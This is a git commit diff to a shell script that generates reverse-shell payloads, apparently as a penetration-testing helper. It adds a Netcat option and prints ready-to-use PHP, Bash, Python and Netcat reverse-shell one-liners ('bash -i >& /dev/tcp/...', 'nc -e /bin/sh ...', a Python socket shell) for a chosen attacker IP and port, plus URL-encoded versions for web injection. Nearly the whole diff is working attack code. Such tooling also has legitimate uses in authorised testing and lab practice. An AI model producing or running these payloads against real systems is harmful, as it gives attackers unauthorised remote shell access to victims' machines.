9e18390251d9253a46db8a18f229f30cd58c1cc6
Zzim Madaki <madaki.sfinances@gmail.com>
2026-03-20 10:46:34 +0100

    Update shell.sh

--- shell.sh
+++ shell.sh
@@ -19,23 +19,19 @@ echo "Your IP Port: $ip_port"
 
 # Create a list of reverse shells
 PS3="Which shell will you use today: "
-list_of_shells=("PHP_One_Liner" "PHP_Classic" "Bash" "Python")
+list_of_shells=("PHP_One_Liner" "Bash" "Python" "Netcat")
 
 select shell in "${list_of_shells[@]}"; do
     case "$REPLY" in
         1)
 	    echo ''
 	    # PHP-One-Liner-Shell specific code is here
-	    php_one_liner_shell='php -r '\''$sock=fsockopen("'"$ip_addr"'",1234);exec("/bin/sh -i <&3 >&3 2>&3");'\'''
+	    php_one_liner_shell='php -r '\''$sock=fsockopen("'"$ip_addr"'","'"$ip_port"'");exec("/bin/sh -i <&3 >&3 2>&3");'\'''
 	    echo "PHP_One_Liner_Shell: $php_one_liner_shell"
 	    echo ''
 	    echo "PHP_One_Liner_Shell (Encoded): $(burp_urlencode "$php_one_liner_shell")"
 	    break;;
         2)
-	    echo ''
-            # Your PHP_Classic specific code here
-            ;;
-        3)
             echo ''
             # Your Bash specific code here
 	    bash_rev_shell="bash -i >& /dev/tcp/"$ip_addr"/"$ip_port" 0>&1"
@@ -43,13 +39,20 @@ select shell in "${list_of_shells[@]}"; do
 	    echo ''
 	    echo "Bash_Reverse_Shell (Encoded): $(burp_urlencode "$bash_rev_shell")"
             break;;
-        4)
+        3)
             echo ''
             # Your Python specific code here
 	    python_rev_shell="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip_addr","$ip_port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
             echo "Python_Reverse_Shell: $python_rev_shell"
 	    echo ''
 	    echo "Python_Reverse_Shell (Encoded): $(burp_urlencode "$python_rev_shell")";;
+	4)
+	    echo ''
+	    #Your Netcat specific code here
+	    netcat_rev_shell="nc -e /bin/sh "$ip_addr" "$ip_port""
+	    echo "Netcat_Reverse_Shell: $netcat_rev_shell"
+	    echo ''
+	    echo "Netcat_Reverse_Shell (Encoded): $(burp_urlencode "$netcat_rev_shell")";;
         *)
             echo "Invalid choice, try again."
             ;;
